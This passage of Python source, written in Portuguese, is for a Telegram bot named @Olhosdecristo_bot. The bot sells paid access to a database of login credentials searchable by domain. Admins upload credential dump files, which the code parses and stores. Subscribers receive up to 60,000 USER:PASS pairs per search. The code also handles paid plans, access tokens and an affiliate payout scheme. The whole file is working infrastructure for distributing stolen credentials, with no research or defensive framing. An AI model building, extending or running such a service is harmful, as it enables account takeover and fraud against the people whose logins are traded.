                        # Criar uma barra de progresso visual
                        if contador_atual > 0:
                            # Estimar progresso baseado na velocidade
                            progress_dots = "⚡" * min(10, (contador_atual // 100) % 10 + 1)
                            new_text = f"☁️ 𝗣𝗿𝗼𝗰𝘂𝗿𝗮𝗻𝗱𝗼 𝗱𝗮𝗱𝗼𝘀 𝗱𝗮 𝗨𝗥𝗟 𝗳𝗼𝗿𝗻𝗲𝗰𝗶𝗱𝗮...\n\n{progress_dots}\n\n🔍 Logins encontrados: {contador_atual:,}\n\n⚡ Buscando em tempo real...\n\n🤖 @Olhosdecristo_bot".replace(",", ".")
                        else:
                            new_text = f"☁️ 𝗣𝗿𝗼𝗰𝘂𝗿𝗮𝗻𝗱𝗼 𝗱𝗮𝗱𝗼𝘀 𝗱𝗮 𝗨𝗥𝗟 𝗳𝗼𝗿𝗻𝗲𝗰𝗶𝗱𝗮...\n\n⏳ Iniciando busca...\n\n🔍 Logins encontrados: {contador_atual}\n\n🤖 @Olhosdecristo_bot"

                        await msg_busca.edit(
                            new_text,
                            buttons=[
                                [Button.inline("🚫 | PARAR PESQUISA", data=f"cancelarbusca:{id_user}")],
                                [Button.inline("❌ | APAGAR MENSAGEM", data=f"apagarmensagem:{id_user}")]
                            ]
                        )
                        print(f"[SEARCH PROGRESS] {contador_atual} logins encontrados para {url}")
                    except Exception as e:
                        if "not modified" not in str(e).lower() and "message not found" not in str(e).lower():
                            logger.error(f"Erro ao editar mensagem: {e}")
                        pass

        tarefa_editar = asyncio.create_task(editar_mensagem_periodicamente())

        def buscar_wrapper():
            try:
                # Usar a classe LoginSearch do arquivo logins_search.py
                # Limite de 60k logins conforme solicitado
                search_instance = LoginSearch(url, id_user, pasta_temp, tasks_canceladas[hash_nome], contador_callback, limite_max=60000)
                return search_instance.buscar()
            except Exception as e:
                logger.error(f"Erro na busca: {e}")
                # Retornar arquivos vazios em caso de erro
                arquivo_raw = os.path.join(pasta_temp, f"{id_user}.txt")
                arquivo_formatado = os.path.join(pasta_temp, f"{id_user}_formatado.txt")

                # Criar arquivos vazios
                with open(arquivo_raw, 'w', encoding='utf-8') as f:
                    pass
                with open(arquivo_formatado, 'w', encoding='utf-8') as f:
                    pass

                return arquivo_raw, arquivo_formatado

        arquivo_raw, arquivo_formatado = await asyncio.to_thread(buscar_wrapper)

        tarefa_editar.cancel()
        try:
            await tarefa_editar
        except asyncio.CancelledError:
            pass

        qtd_logins = 0
        if os.path.exists(arquivo_raw):
            with open(arquivo_raw, "r", encoding="utf-8") as f:
                qtd_logins = sum(1 for _ in f)

        if qtd_logins == 0:
            await msg_busca.edit("❌ 𝗡𝗲𝗻𝗵𝘂𝗺 𝗿𝗲𝘀𝘂𝗹𝘁𝗮𝗱𝗼 𝗳𝗼𝗶 𝗲𝗻𝗰𝗼𝗻𝘁𝗿𝗮𝗱𝗼!\n\n📝 Tente com outro domínio\n\n🤖 @Olhosdecristo_bot")
            shutil.rmtree(pasta_temp, ignore_errors=True)
            usuarios_bloqueados.discard(id_user)
            return

        # Adicionar ao histórico de buscas
        add_search_to_history(id_user, url, qtd_logins)

        relatorio = RelatorioPremium(nome, id_user, now, url, qtd_logins)
        caminho_relatorio = os.path.join(RESULTS_DIR, f"relatorio_{hash_nome}.png")

        try:
            relatorio.gerar_relatorio()
        except Exception as e:
            logger.error(f"Erro ao gerar relatório: {e}")
            with open(caminho_relatorio, 'w') as f:
                f.write("Mock report file")

        await msg_busca.delete()

        await client.send_message(
            event.chat_id,
            f"☁️ 𝗥𝗲𝘀𝘂𝗹𝘁𝗮𝗱𝗼𝘀 𝗲𝗻𝗰𝗼𝗻𝘁𝗿𝗮𝗱𝗼𝘀: {qtd_logins}\n\n📋 Qual formato você deseja?\n\n🤖 @Olhosdecristo_bot",
            buttons=[
                [Button.inline("🔻 USER:PASS", data=f"format1:{id_user}"),
                 Button.inline("📄 FORMATADO", data=f"format2:{id_user}")],
                [Button.inline("❌ CANCELAR", data=f"cancel:{id_user}")]
            ],
            reply_to=event.id
        )

        usuarios_bloqueados.discard(id_user)

        if os.path.exists(caminho_relatorio):
            os.remove(caminho_relatorio)

    except Exception as e:
        logger.error(f"Erro no search_handler: {e}")
        await event.reply("❌ Erro interno durante a busca.")
        usuarios_bloqueados.discard(event.sender_id)

# Helper para criar a barra de progresso.
def create_progress_bar(progress: float, length: int = 10) -> str:
    filled_len = int(length * progress)
    bar = '█' * filled_len + '─' * (length - filled_len)
    return f"[{bar}]"

@client.on(events.NewMessage(func=lambda e: e.file and e.sender_id in ADMIN_IDS))
async def file_upload_handler(event):
    if not (event.document and event.document.mime_type == 'text/plain'):
        await event.respond("⚠️ **Arquivo Inválido.** Envie apenas arquivos no formato `.txt`.")
        return

    msg = await event.respond("📥 **Recebendo arquivo...** Um momento, por favor.")
    temp_path = await client.download_media(event.message.document, file=RESULTS_DIR)

    total_lines = 0
    added_count = 0
    chunk = []
    CHUNK_SIZE = 50000
    last_update_time = datetime.now()
    last_progress = 0

    try:
        await msg.edit("🧐 **Analisando arquivo...** Contando total de linhas.")
        with open(temp_path, 'r', encoding='utf-8', errors='ignore') as file:
            total_lines = sum(1 for line in file)

        if total_lines == 0:
            await msg.edit("⚠️ O arquivo parece estar vazio.")
            return

        await msg.edit("⚙️ **Iniciando processamento...**")
        start_time = datetime.now()

        with open(temp_path, 'r', encoding='utf-8', errors='ignore') as file:
            for i, line in enumerate(file, 1):  # Começar de 1 para facilitar cálculos
                if ':' in line:
                    domain = extract_domain_final(line.split(':', 1)[0])
                    if domain:
                        chunk.append((domain, line.strip()))

                if len(chunk) >= CHUNK_SIZE or i == total_lines:
                    if chunk:
                        added_count += add_logins_to_db(chunk)
                        chunk = []

                # Atualizar progresso a cada 2% ou 1 segundo
                progress_percent = i / total_lines
                now = datetime.now()

                should_update = (
                    (now - last_update_time).total_seconds() >= 1.0 or  # A cada 1 segundo
                    progress_percent >= last_progress + 0.02 or  # A cada 2%
                    i == total_lines or  # Sempre no final
                    i % 10000 == 0  # A cada 10k linhas
                )

                if should_update:
                    last_update_time = now
                    last_progress = progress_percent

                    # Barra de progresso visual
                    progress_bar_length = 20
                    filled_blocks = int(progress_bar_length * progress_percent)
                    empty_blocks = progress_bar_length - filled_blocks

                    progress_bar = "🟩" * filled_blocks + "⬜" * empty_blocks

                    # Calcular velocidade e tempo restante
                    elapsed_seconds = (now - start_time).total_seconds()
                    if elapsed_seconds > 0:
                        lines_per_second = i / elapsed_seconds
                        remaining_lines = total_lines - i
                        eta_seconds = int(remaining_lines / lines_per_second) if lines_per_second > 0 else 0

                        # Formatação do tempo restante
                        if eta_seconds > 3600:
                            eta_str = f"{eta_seconds // 3600}h {(eta_seconds % 3600) // 60}m"
                        elif eta_seconds > 60:
                            eta_str = f"{eta_seconds // 60}m {eta_seconds % 60}s"
                        else:
                            eta_str = f"{eta_seconds}s"

                        speed_str = f"{lines_per_second:.0f} linhas/seg"
                    else:
                        eta_str = "Calculando..."
                        speed_str = "Calculando..."

                    # Formatação dos números
                    processed_lines_str = f"{i:,}".replace(",", ".")
                    total_lines_str = f"{total_lines:,}".replace(",", ".")
                    added_count_str = f"{added_count:,}".replace(",", ".")

                    status_text = (
                        f"⚙️ **Processando Logins - {progress_percent*100:.1f}%**\n\n"
                        f"{progress_bar}\n"
                        f"**{progress_percent*100:.1f}%** completo\n\n"
                        f"📊 **Progresso:**\n"
                        f"• Linhas Processadas: `{processed_lines_str}`\n"
                        f"• Total de Linhas: `{total_lines_str}`\n"
                        f"• Novos Logins Adicionados: `{added_count_str}`\n\n"
                        f"⚡ **Velocidade:** `{speed_str}`\n"
                        f"⏱️ **Tempo Restante:** `{eta_str}`"
                    )

                    try:
                        await msg.edit(status_text)
                        print(f"[PROGRESS] {progress_percent*100:.1f}% - {i}/{total_lines} linhas processadas")
                    except Exception as edit_error:
                        if "not modified" not in str(edit_error).lower():
                            print(f"Erro ao editar mensagem: {edit_error}")

        # Mensagem final
        total_added_str = f"{added_count:,}".replace(",", ".")
        total_lines_str = f"{total_lines:,}".replace(",", ".")
        elapsed_total = (datetime.now() - start_time).total_seconds()

        if elapsed_total > 60:
            time_taken = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"
        else:
            time_taken = f"{int(elapsed_total)}s"

        final_message = (
            f"✅ **Processamento Concluído!**\n\n"
            f"🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩\n"
            f"**100%** - Concluído!\n\n"
            f"📈 **Resultados:**\n"
            f"• **Logins Adicionados:** `{total_added_str}`\n"
            f"• **Linhas Verificadas:** `{total_lines_str}`\n"
            f"• **Tempo Total:** `{time_taken}`\n\n"
            f"🎉 **Arquivo processado com sucesso!**"
        )
        await msg.edit(final_message)

    except Exception as e:
        await msg.edit(f"❌ **Ocorreu um erro durante o processamento:**\n`{e}`")
        await log_action(f"Erro no file_upload_handler: {e}")
        print(f"Erro no processamento: {e}")
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)


@client.on(events.NewMessage(pattern=r'/(ban|cancelar|unban|autorizar|info|reload_admins) ?(\S+)?(.*)'))
async def admin_commands_handler(event):
    if event.sender_id not in ADMIN_IDS: return

    command = event.pattern_match.group(1)
    target_id_str = event.pattern_match.group(2)
    args = event.pattern_match.group(3).strip() if event.pattern_match.group(3) else ""

    if command == "reload_admins":
        reload_admins()
        await event.respond(f"✅ Lista de administradores recarregada! Admins ativos: {len(ADMIN_IDS)}")
        return

    if not target_id_str or not target_id_str.isdigit():
        await event.respond("⚠️ O ID do usuário deve ser um número."); return
    target_id = int(target_id_str)

    if command == "ban":
        if target_id in ADMIN_IDS: await event.respond("Não é possível banir um admin."); return
        ban_user(target_id)
        await event.respond(f"Usuário `{target_id}` foi banido.", parse_mode='Markdown')
    elif command == "unban":
        unban_user(target_id)
        await event.respond(f"Usuário `{target_id}` foi desbanido.", parse_mode='Markdown')
    elif command == "cancelar":
        cancel_plan(target_id)
        await event.respond(f"O plano do usuário `{target_id}` foi cancelado.", parse_mode='Markdown')
    elif command == "info":
        info = f"**🔍 Informações sobre:** `{target_id}`\n\n"
        if is_banned(target_id): info += "🚫 **Status:** `Banido`\n"
        elif is_authorized(target_id): info += f"✅ **Status:** `Ativo`\n   - **Expira em:** {get_user_expiry_date(target_id)}\n"
        else: info += "❌ **Status:** `Inativo`\n"
        stats = get_affiliate_stats(target_id)
        info += f"\n**Afiliado:**\n  - **Indicados:** {stats['referrals']}\n  - **Conversões:** {stats['conversions']}\n  - **Saldo:** R$ {stats['earnings']:.2f}"
        await event.respond(info, parse_mode='Markdown')
    elif command == "autorizar":
        if not args:
            await event.respond("⚠️ Uso: `/autorizar <ID> <tempo>` (ex: 7d, 12h)"); return
        try:
            value = int(args[:-1])
            unit = args[-1].lower()
            if unit == 'd': delta, unit_str = timedelta(days=value), "dia(s)"
            elif unit == 'h': delta, unit_str = timedelta(hours=value), "hora(s)"
            else: await event.respond("⚠️ Unidade de tempo inválida. Use 'd' ou 'h'."); return

            authorize_user_with_delta(target_id, delta)
            await event.respond(f"✅ Usuário `{target_id}` autorizado por **{value} {unit_str}**.", parse_mode='Markdown')
        except (ValueError, IndexError):
            await event.respond("⚠️ Formato de tempo inválido. Ex: `7d` ou `12h`.")

@client.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    await event.answer()

    if data == 'redeem_token_prompt':
        await event.respond("🚀 𝗢𝗸! 𝗘𝗻𝘃𝗶𝗲 𝘀𝗲𝘂 𝘁𝗼𝗸𝗲𝗻 𝗻𝗼 𝗰𝗵𝗮𝘁:\n\n💡 Exemplo: /resgatar SEU-TOKEN-AQUI"); return
    if data == 'group_plans':
        message = (
            "💎 𝗣𝗹𝗮𝗻𝗼𝘀 𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗼𝘀 𝗽𝗮𝗿𝗮 𝗚𝗿𝘂𝗽𝗼𝘀! 💎\n\n"
            "🚀 Leve o poder das nossas buscas para toda a sua equipe com nossos planos corporativos.\n\n"
            "📦 𝗡𝗼𝘀𝘀𝗼𝘀 𝗣𝗮𝗰𝗼𝘁𝗲𝘀:\n\n"
            "🔵 Plano Mensal: R$ 35,00\n"
            "🟢 Plano Bimestral: R$ 55,00\n"
            "🟡 Plano Trimestral: R$ 70,00\n\n"
            "✨ Plano Vitalício: Fale conosco para uma oferta personalizada!\n\n"
            "💬 Interessado? Clique no botão abaixo para negociar."
        )
        await event.edit(message, buttons=[[Button.url("💬 Falar com o Gerente", "https://t.me/Tequ1ladoxxado")], [Button.inline("⬅️ Voltar", b"back_to_start")]]); return
    if data == 'back_to_start':
        await send_start_message(event); return

    if event.sender_id != user_id:
        await event.answer("APENAS O USUÁRIO QUE PEDIU O COMANDO PODE USAR ESSES BOTÕES.\n\nERR_USER_NOT_VERIFIED", alert=True)
        return

    hash_nome = str(user_id)

    if data == "cancelarbusca":
        if hash_nome in tasks_canceladas:
            tasks_canceladas[hash_nome]['cancelled'] = True
        await event.answer("SUA BUSCA FOI CANCELADA COM SUCESSO!\n\nSUCESS_CANCEL_RESULT", alert=True)
        await event.delete()

    elif data == "apagarmensagem":
        await event.delete()

    elif data == "cancel":
        await event.delete()

    elif data.startswith("format1:") or data.startswith("format2:"):
        acao, id_user_btn = data.split(":")
        id_user_btn = int(id_user_btn)

        pasta = os.path.join(TEMP_DIR, str(id_user_btn))
        nome_arquivo = f"{id_user_btn}.txt" if acao == "format1" else f"{id_user_btn}_formatado.txt"
        caminho = os.path.join(pasta, nome_arquivo)

        if not os.path.exists(caminho):
            await event.answer("O ARQUIVO FONTE NÃO FOI ENCONTRADO! TENTE NOVAMENTE MAIS TARDE.\n\nARCHIVE_NOT_FOUND", alert=True)
            return

        await event.delete()
        await asyncio.sleep(0.5)

        sender_entity = await client.get_entity(id_user_btn)
        mention = f"[{sender_entity.first_name}](tg://user?id={id_user_btn})"

        with open(caminho, "r", encoding="utf-8") as f:
            qtd = sum(1 for _ in f)

        caption = f"""☁️ 𝗥𝗲𝘀𝘂𝗹𝘁𝗮𝗱𝗼 𝗘𝗻𝘃𝗶𝗮𝗱𝗼 - 𝗧𝗫𝗧\n\n📊 Quantidade: {qtd:,}\n🌐 URL: {urls_busca.get(id_user_btn, "desconhecida")}\n👤 Solicitado por: {mention}\n\n🤖 @Olhosdecristo_bot""".replace(",", ".")

        await client.send_file(
            event.chat_id,
            file=caminho,
            caption=caption,
            buttons=[[Button.inline("❌ Apagar Mensagem", data=f"deletefile:{id_user_btn}")]],
            reply_to=mensagens_origem.get(id_user_btn)
        )

        await client.send_file(
            event.chat_id,
            file=caminho,
            caption=caption,
            buttons=[[Button.inline("❌ | APAGAR MENSAGEM", data=f"deletefile:{id_user_btn}")]],
            reply_to=mensagens_origem.get(id_user_btn)
        )

        try:
            await client.send_message(MEU_ID, f"""**⚠️ | NOVA CONSULTA DE LOGIN**\n\n**• QUEM FOI:** {mention}\n**• URL:** {urls_busca.get(id_user_btn, "desconhecida")}\n**• QUANTIDADE:** {qtd}\n\n🤖 @Olhosdecristo_bot""")
        except Exception as e:
            logger.error(f"Erro ao notificar admin: {e}")

        shutil.rmtree(pasta, ignore_errors=True)

    # Handlers para Membros Autorizados (incluindo admins no modo membro)
    if is_authorized(user_id):
        if data == 'prompt_search':
            await event.respond("🔍 Para buscar, use o comando:\n/search <dominio>\n\nExemplo: /search google.com")
        elif data == 'my_history':
            history = get_user_search_history(user_id, 10)
            if not history:
                await event.edit("📜 𝐒𝐞𝐮 𝐇𝐢𝐬𝐭𝐨́𝐫𝐢𝐜𝐨 𝐝𝐞 𝐁𝐮𝐬𝐜𝐚𝐬\n\n📭 Nenhuma busca realizada ainda.\n\n💡 Use /search <dominio> para fazer sua primeira busca!", buttons=[[Button.inline("⬅️ Voltar", b"back_to_member_start")]])
            else:
                history_text = "📜 𝐒𝐞𝐮 𝐇𝐢𝐬𝐭𝐨́𝐫𝐢𝐜𝐨 𝐝𝐞 𝐁𝐮𝐬𝐜𝐚𝐬\n\n"
                for domain, count, date in history:
                    # Formatar data
                    try:
                        date_obj = datetime.fromisoformat(date.replace("Z", "+00:00"))
                        formatted_date = date_obj.strftime("%d/%m/%Y %H:%M")
                    except:
                        formatted_date = date
                    history_text += f"🔍 {domain}\n📊 {count:,} logins encontrados\n🕒 {formatted_date}\n\n".replace(",", ".")
                await event.edit(history_text, buttons=[[Button.inline("⬅️ Voltar", b"back_to_member_start")]])
        elif data == 'my_access':
            if user_id in ADMIN_IDS:
                expiry_text = "Vitalício ✨"
                status_text = "👑 Administrador"
            else:
                expiry_text = get_user_expiry_date(user_id)
                status_text = "💎 Membro Premium"
            await event.edit(f"✅ 𝐒𝐞𝐮 𝐚𝐜𝐞𝐬𝐬𝐨 𝐞𝐬𝐭𝐚́ 𝐚𝐭𝐢𝐯𝐨!\n\n📅 Expira em: {expiry_text}\n🏷️ Status: {status_text}", buttons=[[Button.inline("⬅️ Voltar", b"back_to_member_start")]])
        elif data == 'help_member':
            help_text = "❓ 𝐀𝐣𝐮𝐝𝐚\n\n🔍 /search <dominio> - Buscar logins\n💼 /afiliado - Painel de afiliado\n🏠 /start - Menu principal\n🔄 /reset - Resetar dados"
            await event.edit(help_text, buttons=[[Button.inline("⬅️ Voltar", b"back_to_member_start")]])
        elif data == 'affiliate_panel':
            await affiliate_command(event)
        elif data == 'withdraw_prompt':
            stats = get_affiliate_stats(user_id)
            if stats['earnings'] > 0:
                request_withdrawal(user_id, stats['earnings'])
                await event.edit(f"✅ 𝐒𝐨𝐥𝐢𝐜𝐢𝐭𝐚𝐜̧𝐚̃𝐨 𝐝𝐞 𝐒𝐚𝐪𝐮𝐞 𝐄𝐧𝐯𝐢𝐚𝐝𝐚!\n\nSua solicitação para sacar R$ {stats['earnings']:.2f} foi enviada ao administrador.", buttons=[[Button.inline("⬅️ Voltar", b"affiliate_panel_back")]])
            else: await event.answer("Você não tem saldo para sacar.", alert=True)
        elif data == 'top_affiliates':
            await top_affiliates_command(event)
        elif data == 'back_to_member_start':
            if user_id in ADMIN_IDS:
                await send_start_message(event, admin_view=False)
            else:
                await send_start_message(event)
        elif data == 'affiliate_panel_back':
            await affiliate_command(event)
        return

    # Handlers para Admins
    if user_id in ADMIN_IDS:
        if data == 'gen_token_panel':
            buttons = [
                [Button.inline("1 Dia", b"gift_1"), Button.inline("7 Dias", b"gift_7"), Button.inline("30 Dias", b"gift_30")],
                [Button.inline("60 Dias", b"gift_60"), Button.inline("90 Dias", b"gift_90"), Button.inline("Vitalício ✨", b"gift_36500")],
                [Button.inline("⬅️ Voltar ao Painel", b"back_to_admin")]
            ]
            await event.edit("🔑 Selecione a duração do token a ser gerado:", buttons=buttons)
        elif data.startswith('gift_'):
            days = int(data.split('_')[1])
            plan_name = f"{days} dia(s)"
            if days >= 36500: plan_name = "Vitalício ✨"
            token = generate_token(days)
            await event.client.send_message(event.chat_id, f'✅ Token de **{plan_name}** gerado:\n\n`{token}`', parse_mode='Markdown')
        elif data == 'back_to_admin':
            await send_start_message(event)
        elif data == 'stats':
            total_users, banned_users = get_all_users_count(), get_banned_users_count()
            total_logins, total_domains = get_db_stats()
            stats_msg = (f"📊 **Estatísticas**\n\n**Usuários:**\n- Total: `{total_users}` | Banidos: `{banned_users}`\n\n**Banco de Dados:**\n- Logins: `{total_logins:,}`\n- Domínios: `{total_domains:,}`".replace(",", "."))
            await event.edit(stats_msg, parse_mode='Markdown', buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]])
        elif data == 'audit':
            text = "**🛡️ Auditoria**\n\n- `/ban <ID>`\n- `/unban <ID>`\n- `/cancelar <ID>`\n- `/autorizar <ID> <tempo>`\n- `/info <ID>`\n- `/reload_admins`"
            await event.edit(text, buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]])
        elif data == 'show_admin_commands':
            text = ("**📖 Comandos**\n\n**Usuários:**\n`/ban <ID>`\n`/unban <ID>`\n`/cancelar <ID>`\n`/autorizar <ID> <tempo>`\n`/info <ID>`\n\n**Sistema:**\n`/reload_admins`\n`/stats`\n`/dbinfo`\n\nEnvie um `.txt` para adicionar logins.")
            await event.edit(text, buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]])
        elif data == 'clear_db_prompt':
            await event.edit("**⚠️ ATENÇÃO!**\nApagar **TODOS OS LOGINS**? Ação irreversível.", buttons=[[Button.inline("🔴 SIM", b"confirm_clear_db"), Button.inline("Cancelar", b"back_to_admin")]])
        elif data == 'confirm_clear_db':
            await event.edit("⏳ Apagando logins...")
            clear_logins_db()
            await event.edit("✅ **Logins Removidos!**", buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]])
        elif data == 'active_tokens':
            tokens = get_unused_tokens()
            if not tokens:
                await event.edit("Não há tokens ativos no momento.", buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]]); return
            message = "**🔑 Tokens Ativos (não resgatados):**\n\n"
            for token, days in tokens:
                plan = f"{days}d"
                if days >= 36500: plan = "Vitalício"
                message += f"- `{token}` ({plan})\n"
            await event.edit(message, parse_mode='Markdown', buttons=[[Button.inline("⬅️ Voltar", b"back_to_admin")]])
    else:
        await event.answer("🚫 Acesso restrito.", alert=True)

    if data.startswith("deletefile:"):
        id_user_btn = int(data.split(":")[1])
        if event.sender_id != id_user_btn:
            await event.answer("APENAS O USUÁRIO QUE RECEBEU O ARQUIVO PODE APAGAR.\n\nERR_USER_NOT_VERIFIED", alert=True)
            return
        await event.delete()

@client.on(events.CallbackQuery(pattern=r'^deletefile:(\d+)$'))
async def delete_file_handler(event):
    try:
        id_user_btn = int(event.pattern_match.group(1))
        if event.sender_id != id_user_btn:
            await event.answer("APENAS O USUÁRIO QUE RECEBEU O ARQUIVO PODE APAGAR.\n\nERR_USER_NOT_VERIFIED", alert=True)
            return
        await event.delete()
    except Exception as e:
        logger.error(f"Erro no delete_file_handler: {e}")

# --- 7. INICIALIZAÇÃO ---

def reload_admins():
    global ADMIN_IDS
    ADMIN_IDS = get_admins()
    print(f"📋 [ADMIN] Carregados {len(ADMIN_IDS)} administradores: {ADMIN_IDS}")

async def main():
    global ADMIN_IDS
    print("🚀 [INFO] Iniciando o bot Olhosdecristo_bot...")

    init_db()
    keep_alive()
    reload_admins()

    scheduler.add_job(check_expirations, 'cron', hour=10, minute=0)
    scheduler.start()
    print("⏰ [SCHEDULER] Agendador de tarefas iniciado.")

    await client.start(bot_token=BOT_TOKEN)
    print("✅ [INFO] Bot conectado e pronto para uso.")

    me = await client.get_me()
    reload_admins()  # Recarregar admins após conexão
    await log_action(f"**Bot `{me.first_name}` ficou online!** - Admins carregados: {len(ADMIN_IDS)}")

    await client.run_until_disconnected()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())